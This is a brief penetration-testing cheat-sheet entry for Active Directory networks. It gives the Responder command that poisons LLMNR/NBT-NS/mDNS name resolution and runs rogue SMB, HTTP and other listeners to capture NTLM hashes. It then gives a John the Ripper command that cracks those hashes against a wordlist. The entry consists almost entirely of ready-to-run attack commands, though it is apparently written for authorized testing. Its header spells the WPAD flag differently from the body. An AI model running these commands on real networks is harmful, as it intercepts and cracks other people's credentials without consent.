---
title: Responder - LLMNR/NBT-NS Poisoning
category: ad
subcategory: ad-attacks
os: linux
command: responder -I eth0 -wpad -v
tools: responder, john
---


### Run

```bash
responder -I eth0 --wpad -v
```

Responder poisons LLMNR / NBT-NS / mDNS and runs rogue HTTP / SMB / MSSQL / FTP / LDAP listeners. Captured NTLMv1 / NTLMv2 hashes can be cracked offline.

### Crack collected hashes

```bash
john ntlmhashes.txt --wordlist=./PasswordList.txt
```
